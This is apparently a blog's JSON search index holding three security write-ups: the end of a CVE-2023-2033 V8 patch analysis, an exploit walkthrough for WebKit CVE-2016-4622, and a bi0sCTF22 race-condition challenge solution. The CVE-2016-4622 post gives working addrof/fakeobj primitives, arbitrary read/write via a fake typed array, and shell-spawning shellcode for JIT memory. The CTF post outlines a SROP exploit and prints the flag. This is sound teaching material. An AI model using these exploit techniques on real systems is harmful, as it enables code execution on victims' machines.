temporary fix as they introduced another patch after few days for a better fix\nPatch 2 :\nThe patch notes itself is pretty much self explanatory here:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 [error] Define Error.stack property as a JavaScript accessor ... instead of the native data property. This fixes the JS spec violation when reading a data property does not expect any observable side effects. For example, OrdinaryGetOwnProperty (see [https://tc39.es/ecma262/#sec-ordinarygetownproperty](https://tc39.es/ecma262/#sec-ordinarygetownproperty), step 4a). Differences to previous behaviour: - Error.stack is defined as a JavaScript accessor property. - all Error objects get a private \u0026#34;error_stack_symbol\u0026#34; field where the captured stack trace is stored (previously it was added only when the error was actually thrown which caused unnecessary transitions). - Error.captureStackTrace(obj) adds public \u0026#34;stack\u0026#34; accessor property and private \u0026#34;error_stack_symbol\u0026#34; property to given \u0026#34;obj\u0026#34;. - calling \u0026#34;stack\u0026#34; getter/setter is a no-op in case receiver is not an \u0026#34;Error-like\u0026#34; object, i.e. it doesn\u0026#39;t have a \u0026#34;error_stack_symbol\u0026#34; property and it doesn\u0026#39;t have a prototype with such a property (the lookup stops at JSProxy or interceptor). - the \u0026#34;stack\u0026#34; getter walks the prototype chain from receiver until it finds a holder with the \u0026#34;error_stack_symbol\u0026#34; property which is then used for computing the result. This is slightly different from the previous behaviour in case receiver\u0026#39;s prototype chain contains multiple error objects. - the \u0026#34;stack\u0026#34; setter walks the prototype chain from receiver until it finds a holder with the \u0026#34;error_stack_symbol\u0026#34; property and stores the value there. Conclusion I have learnt a lot while doing analysis for this CVE, and the next blog post will be about how this vulnerability was exploited. If you find any mistakes or have any doubts/suggestions feel free to contact me :)\n","date":"2024-01-02T06:24:00+05:30","permalink":"https://sanjayvardhan.github.io/posts/the-holy-hole-analysis-of-cve-2023-2033/","title":"The Holy Hole - Analysis of CVE-2023-2033"},{"content":"Bug Analysis The vulnerability is present in the (slightly commented) implementation of ArrayProtoSlice.\nfirst, let us see what is slice method and how it works.\nThe slice() method returns a shallow copy of a portion of an array into a new array object selected from start to end (end not included) where start and end represent the index of items in that array. The original array will not be modified.\n1 2 3 4 \u0026gt;\u0026gt;\u0026gt; var array = [\u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;d\u0026#39;] undefined \u0026gt;\u0026gt;\u0026gt; array.slice(1,4) b,c,d Now let us take a look at the implementation (slightly commented) of ArrayProtoSlice.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec) { VM\u0026amp; vm = exec-\u0026gt;vm(); auto scope = DECLARE_THROW_SCOPE(vm); JSObject* thisObj = exec-\u0026gt;thisValue().toThis(exec, StrictMode).toObject(exec); ASSERT(!!scope.exception() == !thisObj); if (UNLIKELY(!thisObj)) return { }; unsigned length = toLength(exec, thisObj); // Get the length of the array RETURN_IF_EXCEPTION(scope, { }); unsigned begin = argumentClampedIndexFromStartOrEnd(exec, 0, length); // Get the start index for slicing the array. RETURN_IF_EXCEPTION(scope, { }); unsigned end = argumentClampedIndexFromStartOrEnd(exec, 1, length, length); // Get the end index for slicing the array. RETURN_IF_EXCEPTION(scope, { }); if (end \u0026lt; begin) // Ensure end index is greater than or equal to the begin index end = begin; std::pair\u0026lt;SpeciesConstructResult, JSObject*\u0026gt; speciesResult = speciesConstructArray(exec, thisObj, end - begin); // We can only get an exception if we call some user function. ASSERT(!!scope.exception() == (speciesResult.first == SpeciesConstructResult::Exception)); if (UNLIKELY(speciesResult.first == SpeciesConstructResult::Exception)) return { }; // Check if the result object is an array object, to take fast path. bool okToDoFastPath = speciesResult.first == SpeciesConstructResult::FastPath \u0026amp;\u0026amp; isJSArray(thisObj); RETURN_IF_EXCEPTION(scope, { }); if (LIKELY(okToDoFastPath)) { if (JSArray* result = asArray(thisObj)-\u0026gt;fastSlice(*exec, begin, end - begin)) return JSValue::encode(result); } // Create a new result object using the species constructor JSObject* result; if (speciesResult.first == SpeciesConstructResult::CreatedObject) result = speciesResult.second; else { result = constructEmptyArray(exec, nullptr, end - begin); RETURN_IF_EXCEPTION(scope, { }); } // Copy the elements from the original array object to the result object unsigned n = 0; for (unsigned k = begin; k \u0026lt; end; k++, n++) { JSValue v = getProperty(exec, thisObj, k); RETURN_IF_EXCEPTION(scope, { }); if (v) { result-\u0026gt;putDirectIndex(exec, n, v, 0, PutDirectIndexShouldThrow); RETURN_IF_EXCEPTION(scope, { }); } } scope.release(); setLength(exec, vm, result, n); return JSValue::encode(result); } Simply put, the above code gets the length of the array and converts the args into native integers to get start and end values. Then performs slicing. The slicing is done in two ways:\nFastSlice: Uses memcpy to copy the elements into a new array. Slow path: Loops and copies each element individually to the new array. In the implementation of ArrayProtoSlice, the values are converted to native integers by argumentClampedIndexFromStartOrEnd().\n1 2 unsigned begin = argumentClampedIndexFromStartOrEnd(exec, 0, length); unsigned end = argumentClampedIndexFromStartOrEnd(exec, 1, length, length); 1 2 3 4 5 6 7 8 9 10 11 12 13 static inline unsigned argumentClampedIndexFromStartOrEnd(ExecState* exec, int argument, unsigned length, unsigned undefinedValue = 0) { JSValue value = exec-\u0026gt;argument(argument); if (value.isUndefined()) return undefinedValue; double indexDouble = value.toInteger(exec); if (indexDouble \u0026lt; 0) { indexDouble += length; return indexDouble \u0026lt; 0 ? 0 : static_cast\u0026lt;unsigned\u0026gt;(indexDouble); } return indexDouble \u0026gt; length ? length : static_cast\u0026lt;unsigned\u0026gt;(indexDouble); } 1 2 3 4 \u0026gt;\u0026gt;\u0026gt; a = [\u0026#39;1\u0026#39;,\u0026#39;2\u0026#39;,\u0026#39;3\u0026#39;,\u0026#39;4\u0026#39;,\u0026#39;5\u0026#39;] [1,2,3,4,5] \u0026gt;\u0026gt;\u0026gt; a.slice(1,3) [2,3] Here we can see that even if the parameters are strings, they are converted to native integers.\nAccording to the conversion rules, if an object has a callable property valueOf, it will be called and the return value will be used if it is a primitive value. So, if we change the length using valueof function in one of the parameters, .slice still uses the old length value, So memcpy will now result in out-of-bound access.\nNow let us see what this looks like in action.\n1 2 3 4 5 6 7 8 9 10 var a = []; for (var i = 0; i \u0026lt; 100; i++) a.push(i + 1.23); var b = a.slice(0, { valueOf: function () { a.length = 0; b = [{}, 1.23]; return 5; }, }); print(b); The expected output should be an array with undefined values. But\u0026hellip;\n1 2 spektre@skream:~/webkit$ ./WebKitBuild/Debug/bin/jsc poc.js 1.23,2.23,1.5488838078e-314,6.365987374e-314,6.94548287109343e-310 Here we abused the JS Type Conversions while calculating the \u0026lsquo;begin\u0026rsquo; and \u0026rsquo;end\u0026rsquo; variables during the fast path. During the conversion, valueOf method is executed, the length is set to 0, and the ArrayProtoSlice still uses the old length value which resulted in an Out-Of-Bounds read We can also use this not only to leak values but also to inject values as well.\nNow let us take a look at the commit(650552a) where this bug was patched.\n1 2 3 4 5 6 7 8 9 10 11 12 13 diff --git a/Source/JavaScriptCore/runtime/ArrayPrototype.cpp b/Source/JavaScriptCore/runtime/ArrayPrototype.cpp index cfdd7fceb7f47..08a6ec991afef 100644 --- a/Source/JavaScriptCore/runtime/ArrayPrototype.cpp +++ b/Source/JavaScriptCore/runtime/ArrayPrototype.cpp @@ -863,7 +863,7 @@ EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec) if (UNLIKELY(speciesResult.first == SpeciesConstructResult::Exception)) return JSValue::encode(jsUndefined()); - if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath \u0026amp;\u0026amp; isJSArray(thisObj))) { + if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath \u0026amp;\u0026amp; isJSArray(thisObj) \u0026amp;\u0026amp; length == getLength(exec, thisObj))) { if (JSArray* result = asArray(thisObj)-\u0026gt;fastSlice(*exec, begin, end - begin)) return JSValue::encode(result); } Here the patch adds an additional check for the length of the source array before calling fastSlice.\nBefore we get into details of the exploit, Here are a few things you need to know that might help you understand the exploit better.\nNaN Boxing and JS Values In JSC, The least significant values are used to indicate which type of value it is. This is clearly defined in JSValue.h\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 * The encoding makes use of unused NaN space in the IEEE754 representation. Any value * with the top 13 bits set represents a QNaN (with the sign bit set). QNaN values * can encode a 51-bit payload. Hardware produced and C-library payloads typically * have a payload of zero. We assume that non-zero payloads are available to encode * pointer and integer values. Since any 64-bit bit pattern where the top 15 bits are * all set represents a NaN with a non-zero payload, we can use this space in the NaN * ranges to encode other values (however there are also other ranges of NaN space that * could have been selected). * * This range of NaN space is represented by 64-bit numbers beginning with the 15-bit * hex patterns 0xFFFC and 0xFFFE - we rely on the fact that no valid double-precision * numbers will fall in these ranges. * * The top 15-bits denote the type of the encoded JSValue: * * Pointer { 0000:PPPP:PPPP:PPPP * / 0002:****:****:**** * Double { ... * \\ FFFC:****:****:**** * Integer { FFFE:0000:IIII:IIII * * The scheme we have implemented encodes double precision values by performing a * 64-bit integer addition of the value 2^49 to the number. After this manipulation * no encoded double-precision value will begin with the pattern 0x0000 or 0xFFFE. * Values must be decoded by reversing this operation before subsequent floating point * operations may be peformed. * * 32-bit signed integers are marked with the 16-bit tag 0xFFFE. * * The tag 0x0000 denotes a pointer, or another form of tagged immediate. Boolean, * null and undefined values are represented by specific, invalid pointer values: * * False: 0x06 * True: 0x07 * Undefined: 0x0a * Null: 0x02 Consider this example. We create an array with an Integer, a double, a string, a bool, and an object.\n1 a = [0xdeadbeef,0.1337,\u0026#34;abcd\u0026#34;,true,{}] 1 2 \u0026gt;\u0026gt;\u0026gt; describe(a) Object: 0x7fffadfc4430 with butterfly 0x7fffaddd8288 (0x7fffadff3360:[Array, {}, ArrayWithContiguous, Proto:0x7fffadfd0120]), ID: 87 and this is how the values look in memory\n1 2 3 4 pwndbg\u0026gt; x/16gx 0x7fffaddd8288 0x7fffaddd8288: 0x41ecd5b7dde00000 0x3fc21d14e3bcd35b 0x7fffaddd8298: 0x00007fffa74ef940 0x0000000000000007 0x7fffaddd82a8: 0x00007fffadffc360 0x00000000badbeef0 JSObject An object in JS is a collection of Key-Value pairs, which are called properties.\nconsider this example.\n1 x = {\u0026#39;a\u0026#39;:1,\u0026#39;b\u0026#39;:0.1337,\u0026#39;c\u0026#39;:\u0026#34;lol\u0026#34;,\u0026#39;d\u0026#39;:true,\u0026#39;e\u0026#39;:[1,2,3,4]} we can use describe() to get info about the object.\n1 2 \u0026gt;\u0026gt;\u0026gt; describe(x) Object: 0x7fffadffc1a0 with butterfly (nil) (0x7fffadf9ea30:[Object, {a:0, b:1, c:2, d:3, e:4}, NonArray, Proto:0x7fffadfc40a0, Leaf]), ID: 280 This is how the object looks in memory.\n1 2 3 4 5 pwndbg\u0026gt; x/16gx 0x7fffadffc1a0 0x7fffadffc1a0: 0x0100180000000118 0x0000000000000000 0x7fffadffc1b0: 0xffff000000000001 0x3fc21d14e3bcd35b 0x7fffadffc1c0: 0x00007fffadf94300 0x0000000000000007 0x7fffadffc1d0: 0x00007fffadfc4320 0x0000000000000000 Structure of a JSObject:\n1 2 3 4 5 6 7 8 9 -------------------- StructureID 32 bits -------------------- Header Bits 32 bits -------------------- Butterfly 64 bits -------------------- Inline Properties n*64 bits -------------------- Butterfly Butterfly consists of elements of the array and out-of-line properties. It\u0026rsquo;s called a butterfly because this points to the middle of the structure. The elements are at +ve offsets from the Butterfly pointer and out-of-line properties are at -ve offsets.\n1 2 3 4 \u0026gt;\u0026gt;\u0026gt; a = [0xdeadbeef,0.1337,\u0026#34;abcd\u0026#34;,true,{}] 3735928559,0.1337,abcd,true,[object Object] \u0026gt;\u0026gt;\u0026gt; describe(a) Object: 0x7fffadfc4340 with butterfly 0x7fffadde4108 (0x7fffadff3360:[Array, {}, ArrayWithContiguous, Proto:0x7fffadfd0120]), ID: 87 Here is how a butterfly is represented in memory:\n1 2 3 4 5 pwndbg\u0026gt; x/16gx 0x7fffadde4108 0x7fffadde4108: 0x41ecd5b7dde00000 0x3fc21d14e3bcd35b 0x7fffadde4118: 0x00007fffadf94360 0x0000000000000007 0x7fffadde4128: 0x00007fffadffc1e0 0x00000000badbeef0 0x7fffadde4138: 0x00000000badbeef0 0x00000000badbeef0 Exploit Strategy First, we start with writing our exploit primitives addrof and fakeobj.\nFor addrof, We make use of an array of doubles, which will have its indexing type as ArrayWithDoubles. and use the valueof function to shrink the array, allocate an array with the object, and return a size larger than the array size which will access the object. slice preserves the indexing type, and the data we access is treated as native doubles which gives us JSValue leak which is in the form of 64bit Floating point value. fakeobj follows a similar approach but the other way around.\naddrof primitive\n1 2 3 4 5 6 7 8 9 10 11 12 function addrof(object) { var a = []; for (var i = 0; i \u0026lt; 100; i++) a.push(i + 0.123); var b = a.slice(0, { valueOf: function () { a.length = 0; b = [object]; return 5; }, }); return Int64.fromDouble(b[4]); } fakeobj primitive 1 2 3 4 5 6 7 8 9 10 11 12 function fakeobj(addr) { var a = []; for (var i = 0; i \u0026lt; 100; i++) a.push({}); var b = a.slice(0, { valueOf: function () { a.length = 0; b = [addr.asDouble()]; return 5; }, }); return b[4]; } ``` Now we will aim to achieve arb read/write, we achieve this using a fake Float64Array Instance. Why Float64Array? Typed Arrays store raw binary data, we can get arbitrary read/write if we control the data pointer.\nOk, Before we proceed further, To fake an object, We need a valid JSCell header and JS StructureID which is not static. In this case, We can predict a valid structure id by spraying a lot of objects and adding a different property each time which gives us a unique structure id.\nWe now spray a lot of Float64Array instances and guess the structure id. we can check if the guess is correct using instanceof. After setting up the cell header of fake Float64Array, We make the vector ptr ( pointer to the backing memory ) of the fake object point to another array, which gives us arb read/write. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 function spray() { for (var i = 0; i \u0026lt; 10000; i++) { var a = new Float64Array(1); elem = \u0026#34;aaa\u0026#34; + i; a[elem] = 0xdeadbeef; } } spray(); var temp = new Uint8Array(1000); /* JS cell header for a Float64Array m_structureID m_indexingType m_type m_flags m_cellState */ var jsCellHeader = new Int64([ 0x0,0x10,0x0,0x0, 0x0, 0x2c, 0x08, 0x1, ]); var container = { jsCellHeader: jsCellHeader.asJSValue(), butterfly: false, // Can\u0026#39;t use 0x0 here because of conversion to JSValue, so we use false vector: temp, lengthAndFlags: new Int64(\u0026#34;0x0001000000000100\u0026#34;).asJSValue(), }; 1 2 3 4 5 6 7 8 9 10 11 memory = { read: function (addr, length) { fakearray[2] = addr.asDouble(); var res = new Array(length); for (var i = 0; i \u0026lt; length; i++) res[i] = temp[i]; return res; }, write: function (addr, data) { fakearray[2] = addr.asDouble(); for (var i = 0; i \u0026lt; data.length; i++) temp[i] = data[i]; }, The butterfly of the fake object is an invalid pointer, this causes a crash because of the garbage collector. we fix the fake object and the container to avoid a crash. 1 2 3 4 5 6 7 8 9 10 var empty = {}; var header = memory.read(addrof(empty), 8); memory.write(addrof(container), header); var arr = new Float64Array(8); header = memory.read(addrof(arr), 16); var length = memory.read(Add(addrof(arr), 24), 8); memory.write(addrof(fakearray), header); memory.write(Add(addrof(fakearray), 24), length); fakearray.container = container; We now create a JITed region that has RWX permissions, and get the address of that region using the primitives. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 function jit_funx() { function target(x) { return x; } for (var i = 0; i \u0026lt; 1000; i++) { target(i); } return target; } // var pwn = jit_funx(); var pwn_addr = addrof(pwn); var rwx_addr = memory.read64(Add(pwn_addr, 24)); var jitCodeAddr = memory.read64(Add(rwx_addr, 24)); var shellcode = [ 0x48, 0x31, 0xc0, 0x50, 0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x48, 0x89, 0xe7, 0x50, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0xb0, 0x3b, 0x0f, 0x05, ]; Using the leak, write the shellcode to that address and then call the function. 1 2 3 var code = memory.read64(Add(jitCodeAddr, 32)); memory.write(code, shellcode); pwn(); This will execute the shellcode and pop a shell. Here is the link for the exploit script.\n","date":"2023-04-16T06:19:43+05:30","permalink":"https://sanjayvardhan.github.io/posts/notes-on-cve-2016-4622/","title":"Notes on CVE-2016-4622"},{"content":"tl;dr\nDouble fetch race Condition in store_note function. overwrite size during race window to get buffer overflow. Do SROP for execve(\u0026quot;/bin/sh\\x00\u0026quot;) Challenge Points: 856 No. of solves: 18 Author: spektre\nChallenge description Heard of heap notes? this ain\u0026rsquo;t one.\nInitial analysis The binary is standard x86 64-bit Dynamic stripped executable.\nThe mitigations enabled on the binary are as follows:\n1 2 3 4 5 Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) On reversing the binary, we can see there are 6 options avaiable:\nStore Note - stores note in the shared memory. Delete Note - memset note to 0. Print Note - prints the note. Upgrade Note - Upgrade size of the note. Encrypt/Decrypt - Encrypt note and store note in shared memory. Exit The binary operates with two threads, one thread does all the store, delete, print, upgrade and encrypt functionality and the other thread checks size of the note and memcpy into buf[64] if size is less than 64 once store_note is done.\nVulnerability store_note in thread 1 :\n1 2 3 4 5 6 7 8 9 10 11 void store_note(sh_mem *ptr) { syscall(SYS_write, 1, \u0026#34;Enter Note ID: \u0026#34;, 15); read_input(ptr-\u0026gt;id, 8); syscall(SYS_write, 1, \u0026#34;Enter Note Name: \u0026#34;, 17); read_input(ptr-\u0026gt;name, 16); syscall(SYS_write, 1, \u0026#34;Enter Note Size: \u0026#34;, 17); scanf(\u0026#34;%d\u0026#34;, \u0026amp;ptr-\u0026gt;size); syscall(SYS_write, 1, \u0026#34;Enter Note Content: \u0026#34;, 20); read_input(ptr-\u0026gt;buffer, ptr-\u0026gt;size); ptr-\u0026gt;size_input = true; } Functions running on thread 2 :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 void process(sh_mem *ptr){ sleep(2); if (ptr-\u0026gt;size \u0026gt; 64 || ptr-\u0026gt;size \u0026lt; 0) { syscall(SYS_write, 1, \u0026#34;Size Limit Exceeded\\n\u0026#34;, 20); exit(0); } encrypt_text(ptr); char msg[64]; sleep(1); syscall(SYS_write, 1, \u0026#34;Sent!\\n\u0026#34;, 6); memcpy(msg, ptr-\u0026gt;buffer, ptr-\u0026gt;size); } void *thread2(sh_mem *ptr) { while(true){ ptr-\u0026gt;size_input = false; while (ptr-\u0026gt;size_input == false) { } process(ptr); ptr-\u0026gt;thread2_done = true; } } thread2() starts once store_input is done. If you look closely, we can see there is a Race Condition in process() function which Double fetches size for size check and memcpy, with a sleep() in between. Which gives us enough time to overwrite the size in the race window using Upgrade().\nUpgrade() :\n1 2 3 4 5 6 7 8 9 10 void upgrade_note(sh_mem *ptr) { if(ptr-\u0026gt;thread2_done == false){ syscall(SYS_write, 1, \u0026#34;Error\\n\u0026#34;, 6); return; } syscall(SYS_write, 1, \u0026#34;Enter Note Size: \u0026#34;, 17); scanf(\u0026#34;%d\u0026#34;, \u0026amp;ptr-\u0026gt;size); syscall(SYS_write, 1, \u0026#34;Enter Name: \u0026#34;, 12); read_input(ptr-\u0026gt;name, 0x10); } we can only use upgrade if thread2() completes executing as it checks if ptr-\u0026gt;thread2_done is false. in thread2(), ptr-\u0026gt;size_input is set to false every time loop, but ptr-\u0026gt;thread2_done is not reset, so we can use upgrade_note() during store_note() anytime after the first loop is done. This allows us to overwrite size during the race window to get buffer overflow.\nExploitation The plan for the exploit is as follows:\nUse encrypt_decrypt() function to dump the encrypted payload into the shared memory. store_note() once to get ptr-\u0026gt;thread2_done == true store_note again and overwrite size using upgrade() during the race window to get buffer overflow Now in the rop chain read \u0026ldquo;/bin/sh\\x00\u0026rdquo; into bss using read_input Now set rax to 0x3b using alarm() (prep for SROP to trigger execve(\u0026quot;/bin/sh\\x00\u0026quot;)) Using alarm() twice returns the number of seconds remaining. so first call alarm(0x3b) and then alarm(0). Now setup SigreturnFrame. You can find the full exploit here\nYou can also solve this using ret2libc instead of SROP. The shared memory allocated is right before ld.so page, which has a pointer to an mmaped region. That mmaped region is located right below libc mapping. which gives us enough info to get libc base address, calculate execve address and then do execve(\u0026quot;/bin/sh\\x00\u0026quot;).\nConclusion This is my first time making challenge for a ctf. I had a lot of fun and learnt a lot while making this challenge. Hope you had fun while solving as well.\nFlag: bi0sCTF{D3j4_vu!_1v3_ju5t_b33n_1n_th15_pl4c3_b3f0r3_0b91342067c4}\n","date":"2023-01-24T05:01:57Z","permalink":"https://sanjayvardhan.github.io/posts/bi0sctf22-n0tes/","title":"bi0sCTF22 - n0tes"}]